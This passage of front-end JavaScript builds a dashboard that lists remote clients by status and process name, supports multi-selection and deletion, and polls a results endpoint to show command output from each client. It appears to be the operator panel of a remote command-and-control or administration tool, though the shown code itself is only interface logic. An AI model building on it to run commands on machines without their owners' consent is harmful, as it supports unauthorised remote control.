            const clientId = checkbox.getAttribute('data-client-id');
            if (clientId && clientId in savedStates) {
                checkbox.checked = savedStates[clientId];
                if (savedStates[clientId]) {
                    selectedClients.add(clientId);
                }
            }
        });
        updateSelectedClientsDisplay();
        debugLog('debug', 'Restored checkbox states:', savedStates);
    } catch (error) {
        debugLog('error', 'Failed to restore checkbox states:', error);
    }
}

function clearConsole() {
    const consoleOutput = document.getElementById('console-output');
    if (consoleOutput) {
        consoleOutput.innerHTML = '';
        addToConsole('Console cleared.');
        addToConsole('');
        showNotification('Console cleared', 'success');
    }
}

function updateClientList(clients) {
    debugLog('info', 'Updating client list...', clients);
    
    const clientList = document.getElementById('client-list');
    if (!clientList) {
        debugLog('error', 'Client list element not found');
        return;
    }
    clientList.innerHTML = '';
    
    clients.forEach(client => {
        const lastSeenDateTime = new Date(client.lastSeen);
        const timeSinceLastSeen = Date.now() - lastSeenDateTime.getTime();
        const secondsSinceLastSeen = timeSinceLastSeen / 1000;
        
        let status = client.status || 'Unknown';
        let statusClass = 'dead';
        
        switch (status.toLowerCase()) {
            case 'online':
            case 'active':
                statusClass = 'active';
                status = 'Active';
                break;
            case 'idle':
                statusClass = 'idle';
                status = 'Idle';
                break;
            case 'inactive':
            case 'removed':
            case 'dead':
            default:
                statusClass = 'dead';
                status = 'Dead';
                break;
        }
        
        const firstSeenDateTime = new Date(client.firstSeen).toLocaleString();
        const lastSeenTimeStr = lastSeenDateTime.toLocaleString();
        
        const row = document.createElement('tr');
        row.className = 'border-b border-gray-700/30 client-row transition-all duration-200 cursor-pointer hover:bg-gray-800/50';
        row.setAttribute('data-client-id', client.id);
        row.setAttribute('data-status', status);
        
        if (selectedClients.has(client.id)) {
            row.classList.add('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
        }
        
        const idCell = document.createElement('td');
        idCell.className = 'py-4 px-4 text-sm';
        
        const idContainer = document.createElement('div');
        idContainer.className = 'flex items-center space-x-2';
        
        const statusDot = document.createElement('span');
        statusDot.className = `status-dot ${statusClass}`;
        
        const idText = document.createElement('span');
        idText.className = 'font-medium';
        idText.textContent = client.id;
        
        idContainer.appendChild(statusDot);
        idContainer.appendChild(idText);
        idCell.appendChild(idContainer);
        row.appendChild(idCell);
        
        const firstSeenCell = document.createElement('td');
        firstSeenCell.className = 'py-4 px-4 text-sm';
        
        const firstSeenDiv = document.createElement('div');
        const firstSeenIcon = document.createElement('i');
        firstSeenIcon.className = 'fas fa-clock text-gray-500 mr-1';
        firstSeenDiv.appendChild(firstSeenIcon);
        firstSeenDiv.appendChild(document.createTextNode(' First seen'));
        
        const firstSeenDisplay = document.createElement('div');
        firstSeenDisplay.className = 'text-gray-300';
        firstSeenDisplay.textContent = firstSeenDateTime;
        firstSeenDiv.appendChild(firstSeenDisplay);
        
        firstSeenCell.appendChild(firstSeenDiv);
        row.appendChild(firstSeenCell);
        
        const lastSeenCell = document.createElement('td');
        lastSeenCell.className = 'py-4 px-4 text-sm';
        
        const lastSeenDiv = document.createElement('div');
        const lastSeenIcon = document.createElement('i');
        lastSeenIcon.className = 'fas fa-history text-gray-500 mr-1';
        lastSeenDiv.appendChild(lastSeenIcon);
        lastSeenDiv.appendChild(document.createTextNode(' Last seen'));
        
        const lastSeenDisplay = document.createElement('div');
        lastSeenDisplay.className = 'text-gray-300';
        lastSeenDisplay.textContent = lastSeenTimeStr;
        lastSeenDiv.appendChild(lastSeenDisplay);
        
        const timeSince = document.createElement('div');
        timeSince.className = `text-xs ${statusClass === 'dead' ? 'text-red-400' : 'text-gray-400'} mt-0.5`;
        timeSince.textContent = getTimeSinceLastSeen(timeSinceLastSeen);
        lastSeenDiv.appendChild(timeSince);
        
        lastSeenCell.appendChild(lastSeenDiv);
        row.appendChild(lastSeenCell);
        
        const statusCell = document.createElement('td');
        statusCell.className = 'py-4 px-4 text-sm';
        
        const statusBadge = document.createElement('span');
        statusBadge.className = `status-badge ${statusClass} px-3 py-1 rounded-full text-xs font-medium`;
        statusBadge.textContent = status;
        
        statusCell.appendChild(statusBadge);
        row.appendChild(statusCell);

        const processCell = document.createElement('td');
        processCell.className = 'py-4 px-4 text-sm';
        
        const processName = client.info && client.info.processName ? client.info.processName : 'Unknown';
        const processSpan = document.createElement('span');
        processSpan.className = 'font-mono text-green-400 text-xs';
        processSpan.textContent = processName;
        
        processCell.appendChild(processSpan);
        row.appendChild(processCell);

        const actionsCell = document.createElement('td');
        actionsCell.className = 'py-4 px-4';
        
        const actionsContainer = document.createElement('div');
        actionsContainer.className = 'flex gap-3';
        
        const deleteBtn = document.createElement('button');
        deleteBtn.className = 'action-button hover:text-red-400 transition-colors';
        deleteBtn.title = 'Delete Client';
        deleteBtn.onclick = () => deleteClient(client.id);
        
        const deleteBtnIcon = document.createElement('i');
        deleteBtnIcon.className = 'fas fa-trash';
        deleteBtn.appendChild(deleteBtnIcon);
        
        actionsContainer.appendChild(deleteBtn);
        actionsCell.appendChild(actionsContainer);
        row.appendChild(actionsCell);
        
        clientList.appendChild(row);
        
        row.addEventListener('click', (e) => {
            if (e.target.closest('button')) {
                return;
            }
            
            const wasSelected = selectedClients.has(client.id);
            
            if (e.ctrlKey || e.metaKey) {
                if (wasSelected) {
                    selectedClients.delete(client.id);
                    row.classList.remove('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                } else {
                    selectedClients.add(client.id);
                    row.classList.add('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                }
            } else {
                document.querySelectorAll('.client-row').forEach(r => {
                    r.classList.remove('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                });
                selectedClients.clear();
                
                selectedClients.add(client.id);
                row.classList.add('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
            }
            
            row.style.transform = 'scale(1.01)';
            setTimeout(() => {
                row.style.transform = 'scale(1)';
            }, 150);
            
            selectedClientId = client.id;
            window.selectedClientId = client.id;
            debugLog('debug', `Selected client: ${selectedClientId}`);
            updateSelectedClientsDisplay();
            
            if (e.ctrlKey || e.metaKey) {
                showNotification(wasSelected ? 'Removed from selection' : 'Added to selection', 'info');
            } else {
                showNotification(`Selected client: ${client.id}`, 'info');
            }
        });
    });
    
    debugLog('success', 'Client list updated successfully');
    
    const counts = updateClientStatusCounts();
    debugLog('debug', 'Updated client counts:', counts);
    
    try {               
        filterClientsByTab();
    } catch (error) {
        debugLog('error', 'Error filtering clients:', error);
    }
}

function getTimeSinceLastSeen(timeSinceLastSeen) {
    const seconds = Math.floor(timeSinceLastSeen / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    const days = Math.floor(hours / 24);
    
    if (minutes < 1) {
        return `${seconds} second${seconds === 1 ? '' : 's'} ago`;
    } else if (minutes < 60) {
        return `${minutes} minute${minutes === 1 ? '' : 's'} ago`;
    } else if (hours < 24) {
        return `${hours} hour${hours === 1 ? '' : 's'} ago`;
    } else {
        return `${days} day${days === 1 ? '' : 's'} ago`;
    }
}

async function deleteClient(clientId) {
    try {
        const headers = getAuthHeaders();
        if (!headers) {
            console.warn('No authentication tokens available');
            return;
        }
        
        const response = await fetch(`${API.BASE_URL}/delete-client?id=${clientId}`, {
            method: 'DELETE',
            headers: headers
        });
        
        if (!response.ok) {
            throw new Error(`Server returned ${response.status}: ${response.statusText}`);
        }
        
        selectedClients.delete(clientId);
        
        if (clientId === selectedClientId) {
            selectedClientId = null;
            window.selectedClientId = null;
            updateSelectedClientDisplay();
        }
        
        addToConsole(`Client ${clientId} deleted successfully`, 'text-green-400');
        
        fetchActiveClients();
        
    } catch (error) {
        console.error('Error deleting client:', error);
        addToConsole(`Failed to delete client: ${error.message}`, 'text-red-400');
    }
}

async function refreshClients() {
    await fetchActiveClients();
}

function updateSelectAllCheckboxState() {
    debugLog('debug', 'Updating select all checkbox state');
    const selectAllCheckbox = document.getElementById('select-all-checkbox');
    if (!selectAllCheckbox) {
        debugLog('warning', 'Select all checkbox not found');
        return;
    }
    
    const checkboxes = document.querySelectorAll('.client-checkbox');
    if (!checkboxes.length) {
        debugLog('debug', 'No client checkboxes found');
        selectAllCheckbox.checked = false;
        return;
    }
    
    let allChecked = true;
    let visibleCount = 0;
    
    checkboxes.forEach(checkbox => {
        const row = checkbox.closest('tr');
        if (row && row.style.display !== 'none') {
            visibleCount++;
            if (!checkbox.checked) {
                allChecked = false;
            }
        }
    });
    
    debugLog('debug', `Select all state: ${allChecked} (${visibleCount} visible checkboxes)`);
    selectAllCheckbox.checked = visibleCount > 0 && allChecked;
}

function initSelectionButtons() {
    const selectAllActiveBtn = document.getElementById('selectAllActiveBtn');
    const selectAllIdleBtn = document.getElementById('selectAllIdleBtn');
    const selectAllDeadBtn = document.getElementById('selectAllDeadBtn');

    if (selectAllActiveBtn) {
        selectAllActiveBtn.addEventListener('click', () => {
            debugLog('debug', 'Select All Active button clicked');
            
            selectedClients.clear();
            
            const rows = document.querySelectorAll('.client-row');
            let activeCount = 0;
            
            rows.forEach(row => {
                const status = row.getAttribute('data-status');
                const clientId = row.getAttribute('data-client-id');
                
                if (status && clientId && status.toLowerCase() === 'active' && row.style.display !== 'none') {
                    selectedClients.add(clientId);
                    row.classList.add('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                    activeCount++;
                } else {
                    row.classList.remove('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                }
            });

            updateSelectedClientsDisplay();
            if (activeCount > 0) {
                showNotification(`Selected ${activeCount} active clients`, 'success');
            } else {
                showNotification('No active clients found', 'warning');
            }
            
            selectAllActiveBtn.classList.add('bg-green-500/10');
            setTimeout(() => {
                selectAllActiveBtn.classList.remove('bg-green-500/10');
            }, 200);
        });
    }

    if (selectAllIdleBtn) {
        selectAllIdleBtn.addEventListener('click', () => {
            debugLog('debug', 'Select All Idle button clicked');
            
            selectedClients.clear();
            
            const rows = document.querySelectorAll('.client-row');
            let idleCount = 0;
            
            rows.forEach(row => {
                const status = row.getAttribute('data-status');
                const clientId = row.getAttribute('data-client-id');
                
                if (status && clientId && status.toLowerCase() === 'idle' && row.style.display !== 'none') {
                    selectedClients.add(clientId);
                    row.classList.add('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                    idleCount++;
                } else {
                    row.classList.remove('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                }
            });
            
            updateSelectedClientsDisplay();
            if (idleCount > 0) {
                showNotification(`Selected ${idleCount} idle clients`, 'success');
            } else {
                showNotification('No idle clients found', 'warning');
            }
            
            selectAllIdleBtn.classList.add('bg-yellow-500/10');
            setTimeout(() => {
                selectAllIdleBtn.classList.remove('bg-yellow-500/10');
            }, 200);
        });
    }

    if (selectAllDeadBtn) {
        selectAllDeadBtn.addEventListener('click', () => {
            debugLog('debug', 'Select All Dead button clicked');
            
            selectedClients.clear();
            
            const rows = document.querySelectorAll('.client-row');
            let deadCount = 0;
            
            rows.forEach(row => {
                const status = row.getAttribute('data-status');
                const clientId = row.getAttribute('data-client-id');
                
                if (status && clientId && status.toLowerCase() === 'dead' && row.style.display !== 'none') {
                    selectedClients.add(clientId);
                    row.classList.add('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                    deadCount++;
                } else {
                    row.classList.remove('bg-blue-900/30', 'border-l-4', 'border-l-blue-500');
                }
            });
            
            updateSelectedClientsDisplay();
            if (deadCount > 0) {
                showNotification(`Selected ${deadCount} dead clients`, 'success');
            } else {
                showNotification('No dead clients found', 'warning');
            }
            
            selectAllDeadBtn.classList.add('bg-red-500/10');
            setTimeout(() => {
                selectAllDeadBtn.classList.remove('bg-red-500/10');
            }, 200);
        });
    }
}

let consoleZoomLevel = 1;

function setConsoleZoom(zoomLevel) {
    const consoleOutput = document.getElementById('console-output');
    const consoleCommand = document.getElementById('console-command');
    
    if (consoleOutput) {
        const allTextElements = consoleOutput.querySelectorAll('div');
        allTextElements.forEach(element => {
            element.style.fontSize = `${14 * zoomLevel}px`;
            element.style.lineHeight = `${1.4 * zoomLevel}`;
        });
        
        consoleOutput.setAttribute('data-zoom-level', zoomLevel);
    }
    
    if (consoleCommand) {
        consoleCommand.style.fontSize = `${12 * zoomLevel}px`;
    }
}


function initializeConsoleZoom() {
    const consoleOutput = document.getElementById('console-output');
    
    consoleOutput.addEventListener('wheel', (e) => {
        if (e.ctrlKey) {
            e.preventDefault();
            
            if (e.deltaY < 0) {
                consoleZoomLevel = Math.min(consoleZoomLevel + 0.1, 3);
            } else {
                consoleZoomLevel = Math.max(consoleZoomLevel - 0.1, 0.5);
            }
            
            setConsoleZoom(consoleZoomLevel);
        }
    });
}

function initializeClientsSectionResize() {
    const clientsSection = document.getElementById('clients-section');
    const interactionArea = document.getElementById('interaction-area');
    let isResizing = false;
    let startY = 0;
    let startHeight = 0;

    function startResize(e) {
        isResizing = true;
        startY = e.clientY;
        startHeight = parseInt(window.getComputedStyle(clientsSection).height, 10);
        
        document.body.style.cursor = 'ns-resize';
        document.body.style.userSelect = 'none';
        
        e.preventDefault();
    }

    function doResize(e) {
        if (!isResizing) return;
        
        const deltaY = e.clientY - startY;
        const newHeight = startHeight + deltaY;
        
        const minHeight = 150;
        const maxHeight = window.innerHeight * 0.8;
        
        if (newHeight >= minHeight && newHeight <= maxHeight) {
            clientsSection.style.height = newHeight + 'px';
            
            const tableContainer = document.getElementById('clients-table-container');
            if (tableContainer) {
                tableContainer.style.height = `calc(100% - 40px)`;
            }
        }
    }

    function stopResize() {
        if (!isResizing) return;
        
        isResizing = false;
        document.body.style.cursor = '';
        document.body.style.userSelect = '';
    }

    clientsSection.addEventListener('mousedown', (e) => {

        const rect = clientsSection.getBoundingClientRect();
        const borderZone = 5;
        
        if (e.clientY >= rect.bottom - borderZone) {
            startResize(e);
        }
    });

    document.addEventListener('mousemove', doResize);
    document.addEventListener('mouseup', stopResize);
    
    clientsSection.addEventListener('mousemove', (e) => {
        if (isResizing) return;
        
        const rect = clientsSection.getBoundingClientRect();
        const borderZone = 5;
        
        if (e.clientY >= rect.bottom - borderZone) {
            clientsSection.style.cursor = 'ns-resize';
        } else {
            clientsSection.style.cursor = '';
        }
    });

    clientsSection.addEventListener('mouseleave', () => {
        if (!isResizing) {
            clientsSection.style.cursor = '';
        }
    });
}

document.addEventListener('DOMContentLoaded', () => {
    initializeClientsSectionResize();
});

function initializeSimpleSearch() {
    const searchInput = document.querySelector('#console-section input[placeholder="Search..."]');
    const consoleOutput = document.getElementById('console-output');
    
    if (!searchInput) return;
    
    searchInput.addEventListener('input', (e) => {
        const term = e.target.value.toLowerCase();
        const lines = consoleOutput.querySelectorAll('div');
        
        lines.forEach(line => {
            const text = line.textContent.toLowerCase();
            if (term && text.includes(term)) {
                line.style.backgroundColor = 'rgba(59, 130, 246, 0.2)';
                line.style.border = '1px solid #3b82f6';
            } else {
                line.style.backgroundColor = '';
                line.style.border = '';
            }
        });
        
        if (term) {
            const firstMatch = Array.from(lines).find(line => 
                line.textContent.toLowerCase().includes(term)
            );
            if (firstMatch) {
                firstMatch.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        }
    });
}

async function fetchCommandResults() {
    try {
        const headers = getAuthHeaders();
        if (!headers) return;
        
        const response = await fetch('/api/results', { headers });
        if (response.ok) {
            const data = await response.json();
            if (data.results && data.results.length > 0) {
                data.results.forEach(result => {
                    if (!displayedResults.has(result.id)) {
                        addToConsole(`Result from ${result.client_id}:`, 'text-blue-400');
                        addToConsole(result.output, 'text-green-400');
                        addToConsole('─'.repeat(50), 'text-gray-600');
                        displayedResults.add(result.id);
                    }
                });
            }
        }
    } catch (error) {
        console.error('Error fetching results:', error);
    }
}

setInterval(fetchCommandResults, 2000);

document.addEventListener('DOMContentLoaded', initializeSimpleSearch);

document.addEventListener('DOMContentLoaded', initializeConsoleZoom);

document.addEventListener('DOMContentLoaded', initSelectionButtons);